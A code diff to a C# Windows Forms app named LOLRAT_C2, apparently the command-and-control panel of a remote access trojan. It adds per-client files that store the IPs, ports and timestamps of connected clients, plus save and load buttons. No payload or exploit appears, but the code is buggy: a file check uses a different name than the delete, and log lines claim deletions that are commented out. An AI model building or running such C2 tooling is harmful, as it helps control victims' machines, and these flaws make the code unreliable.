@@ -43,6 +43,9 @@ namespace LOLRAT_C2
 
             // Set the selection mode to FullRowSelect
             dgvClients.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
+
+            // Simulate press of btnShowClients
+            btnShowClients.PerformClick();
         }
 
         // ---------------------------------------------------------------------------
@@ -479,17 +482,28 @@ namespace LOLRAT_C2
         //
         // ---------------------------------------------------------------------------
         // Method to save client information to a file
-        private void SaveClientInfoToFile()
+        private void SaveClientInfoToFile(ClientInfo client)
         {
+            InfoOutput("Saving client info to txt file...\r\n");
             try
             {
-                using (StreamWriter writer = new StreamWriter("client_info.txt"))
+                // Look if there is a directory called Clients in current dir If not, create it.
+                if (!Directory.Exists("Clients"))
                 {
-                    foreach (ClientInfo client in connectedClients)
-                    {
-                        writer.WriteLine($"{client.IP}:{client.Port},{client.FirstSeen},{client.LastSeen}");
-                    }
+                    Directory.CreateDirectory("Clients");
                 }
+                // Check if there is a file with the name client_info_{IP of client}.txt in the Clients dir If there is, delete it.
+                if (File.Exists("Clients/client_info_" + DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss") + ".txt"))
+                {
+                    File.Delete("Clients/client_info_" + client.IP + ".txt");
+                }
+                // Add new file called client_info_{ClientIP}.txt in the Clients dir
+                using (StreamWriter writer = new StreamWriter("Clients/client_info_" + client.IP + ".txt"))
+                {
+                    writer.WriteLine(client.IP + ":" + client.Port + "," + client.FirstSeen + "," + client.LastSeen);
+                }
+
+                InfoOutput($"Saved client info to txt file!\r\n");
             }
             catch (IOException ex)
             {
@@ -502,38 +516,88 @@ namespace LOLRAT_C2
         {
             try
             {
-                if (File.Exists("client_info.txt"))
+                if (!Directory.Exists("Clients"))
                 {
-                    using (StreamReader reader = new StreamReader("client_info.txt"))
+                    Directory.CreateDirectory("Clients");
+                }
+                // Look for all files in the Clients dir that starts with client_info_
+                string[] clientInfoFiles = Directory.GetFiles("Clients", "client_info_*.txt");
+
+                // Print out all clients that is active
+                DebugOutput("CLIENTS ACTIVE:");
+                foreach (ClientInfo client in connectedClients)
+                {
+                    DebugOutput("Active client: " + client.IP);
+                }
+                
+                // Print out all files names that was found
+                DebugOutput("FILES FOUND:");
+                foreach (string clientInfoFile in clientInfoFiles)
+                {
+                    DebugOutput("Found file: " + clientInfoFile);
+                }
+
+                // Iterate through all files and look if any client has the same IP as the file name on any file.
+                foreach (string clientInfoFile in clientInfoFiles)
+                {
+                    string fileName = Path.GetFileName(clientInfoFile);
+                    string[] fileNameParts = fileName.Split('_');
+                    if (fileNameParts.Length == 3)
                     {
-                        string line;
-                        while ((line = reader.ReadLine()) != null)
+                        string clientIP = fileNameParts[2].Replace(".txt", "");
+                        DebugOutput("Extracted the following IP from \"{}\": " + clientIP);
+                        // Find port that matches clientIP from DataGridView
+
+
+
+                        ClientInfo clientInfo = FindClientByIPAndPort(clientIP, 0);
+                        if (clientInfo != null)
                         {
-                            string[] parts = line.Split(',');
-
-                            if (parts.Length >= 3)
+                            // Replace the found client that was found's info with the info from the file.
+                            using (StreamReader reader = new StreamReader(clientInfoFile))
                             {
-                                string[] ipAndPort = parts[0].Split(':');
-                                if (ipAndPort.Length == 2)
+                                string line = reader.ReadLine();
+                                string[] lineParts = line.Split(',');
+                                if (lineParts.Length == 3)
                                 {
-                                    string clientIP = ipAndPort[0];
-                                    int clientPort = int.Parse(ipAndPort[1]);
-                                    DateTime firstSeen = DateTime.Parse(parts[1]);
-                                    DateTime lastSeen = DateTime.Parse(parts[2]);
-
-                                    // Create a new instance of ClientInfo with loaded data
-                                    ClientInfo clientInfo = new ClientInfo
-                                    {
-                                        IP = clientIP,
-                                        Port = clientPort,
-                                        FirstSeen = firstSeen,
-                                        LastSeen = lastSeen
-                                    };
-
-                                    // Add the loaded client info to the list
-                                    connectedClients.Add(clientInfo);
+                                    clientInfo.IP = lineParts[0].Split(':')[0];
+                                    DebugOutput("Found IP: " + lineParts[0].Split(':')[0]);
+                                    clientInfo.Port = int.Parse(lineParts[0].Split(':')[1]);
+                                    DebugOutput("Found Port: " + lineParts[0].Split(':')[1]);
+                                    clientInfo.FirstSeen = DateTime.Parse(lineParts[1]);
+                                    DebugOutput("Found FirstSeen: " + lineParts[1]);
+                                    clientInfo.LastSeen = DateTime.Parse(lineParts[2]);
+                                    DebugOutput("Found LastSeen: " + lineParts[2]);
                                 }
+                                else
+                                {
+                                    // If the file is not in the correct format, delete it.
+                                    //File.Delete(clientInfoFile);
+                                    DebugOutput("Saved file was not in the correct format. Deleted it.");
+                                }
+                                // Replace the DataGridView row with the new info from file execpt last seen.
+                                dgvClients.Invoke(new Action(() =>
+                                {
+                                    foreach (DataGridViewRow row in dgvClients.Rows)
+                                    {
+                                        if (row.Cells["ID"].Value.ToString() == clientInfo.ID.ToString())
+                                        {
+                                            row.Cells["IP"].Value = clientInfo.IP;
+                                            row.Cells["Port"].Value = clientInfo.Port;
+                                            row.Cells["FirstSeen"].Value = clientInfo.FirstSeen;
+                                            break;
+                                        }
+                                    }
+                                }));
+                            
+                            
                             }
+                        }
+                        else
+                        {
+                            // If the client was not found in the DataGridView, delete the file.
+                            //File.Delete(clientInfoFile);
+                            DebugOutput("Client was not found in the DataGridView. Deleted the file.");
                         }
                     }
                 }
@@ -706,6 +770,43 @@ namespace LOLRAT_C2
             Environment.Exit(0);
         }
 
+
+        // ---------------------------------------------------------------------------
+        //
+        //                         Debug Saving/Loading Info
+        //
+        // ---------------------------------------------------------------------------
+        private void btnSaveClient_Click(object sender, EventArgs e)
+        {
+            // Find current selected client and save its info to a file
+            if (dgvClients.SelectedRows.Count > 0)
+            {
+                // Get the selected row
+                DataGridViewRow selectedRow = dgvClients.SelectedRows[0];
+
+                if (selectedRow != null) // Check if a row is actually selected
+                {
+                    // Extract the IP and Port from the selected row
+                    string clientIP = selectedRow.Cells["IP"].Value.ToString();
+                    int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());
+
+                    // Find the corresponding client from the client list
+                    ClientInfo selectedClient = FindClientByIPAndPort(clientIP, clientPort);
+
+                    // Check if the selected client was found
+                    if (selectedClient != null)
+                    {
+                        SaveClientInfoToFile(selectedClient);
+                    }
+                }
+            }
+        }
+
+        private void btnLoadClient_Click(object sender, EventArgs e)
+        {
+            // Run the InitializeClientInfo method to load client information from files
+            InitializeClientInfo();
+        }
     }
 
 
